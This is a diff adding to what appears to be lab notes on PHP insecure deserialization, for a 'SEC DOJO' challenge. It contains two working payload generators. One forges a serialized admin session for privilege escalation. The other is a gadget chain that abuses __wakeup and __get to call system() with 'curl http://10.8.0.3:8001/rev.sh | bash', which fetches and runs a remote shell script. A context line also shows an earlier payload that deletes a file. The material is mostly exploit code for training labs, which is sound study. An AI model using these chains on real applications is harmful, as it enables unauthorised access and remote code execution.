@@ -389,6 +389,137 @@ $property->setValue($customTemp,'rm /home/carlos/morale.txt');
 echo base64_encode(serialize($customTemp));
 ?>
 ```
+----------------
+
+###  SEC DOJO Serial chain
+
+----------------
+
+- Privesc chain-:
+
+```php
+<?php
+//User class
+class User {
+    private $id;
+    private $email;
+    private $role;
+    private $firstName;
+    private $lastName;
+    private $createdAt;
+
+    public function __construct($id, $email, $role = 'user', $firstName = '', $lastName = '', $phone = '', $createdAt = '') {
+        $this->id = $id;
+        $this->email = $email;
+        $this->role = $role;
+        $this->firstName = $firstName;
+        $this->lastName = $lastName;
+        $this->createdAt = $createdAt;
+    }
+}
+//UserSession class
+class UserSession {
+    private $user;
+    private $sessionId;
+    private $createdAt;
+    
+    public function __construct($user, $sessionId = null) {
+        $this->user = $user;
+        $this->sessionId = $sessionId ?: uniqid('session_');
+        $this->createdAt = time();
+    }
+}
+//prepping User up
+$user =  new User('3','me@gmail.com','admin','me','me@gmail,com','0810999599','');
+
+//prepping UserSession
+$usersession =  new UserSession($user,'session_6887b7864bbac');
+
+echo urlencode(base64_encode(serialize($usersession)));
+?>
+```
+
+- RCE_chain-:
+
+```php
+<?php
+class MessageTemplate {
+    public $template_engine; 
+    public $variables;       
+    public $rendered_content;
+    public $template_name;
+    public $template_type;
+
+    public function __construct($engine_type = 'HTML_RENDERER', $name = '', $type = 'notification') {
+        $this->variables = '';
+        $this->template_engine = $engine_type;
+        $this->template_name = $name;
+        $this->template_type = $type;
+        $this->render_template();
+    }
+
+    public function __sleep() {
+        return ["template_engine", "variables", "template_name", "template_type"];
+    }
+
+    public function __wakeup() {
+        $this->render_template();
+    }
+
+    private function render_template() {
+        $this->rendered_content = new RenderedMessage($this->template_engine, $this->variables);
+    }
+    public function setContent($html, $text, $subject) {
+        $this->variables->HTML_RENDERER = $html;
+        $this->variables->TEXT_RENDERER = $text;
+        $this->variables->EMAIL_RENDERER = $subject;
+        $this->render_template();
+    }
+
+    public function getHtmlContent() {
+        return $this->variables->HTML_RENDERER;
+    }
+
+    public function getTextContent() {
+        return $this->variables->TEXT_RENDERER;
+    }
+
+    public function getSubject() {
+        return $this->variables->EMAIL_RENDERER;
+    }
+}
+
+class RenderedMessage {
+    public $content;
+    public $metadata;
+
+    public function __construct($engine_type, $variables) {
+        $this->content = $variables->$engine_type;
+        $this->metadata = [
+            'engine' => $engine_type,
+            'rendered_at' => date('Y-m-d H:i:s'),
+            'version' => '1.0'
+        ];
+    }
+}
+class SystemExecutor {
+    private $command_handler;
+
+    public function __construct($handler) {
+        $this->command_handler = $handler;
+    }
+
+    public function __get($name) {
+        return call_user_func($this->command_handler, $name);
+    }
+}
+//SystemExecutor
+$executor = new SystemExecutor('system');
+$template = new MessageTemplate('curl http://10.8.0.3:8001/rev.sh | bash');
+$template->variables = $executor;
+echo urlencode(base64_encode(serialize($template)));
+?>
+```
 
 ----------------
 
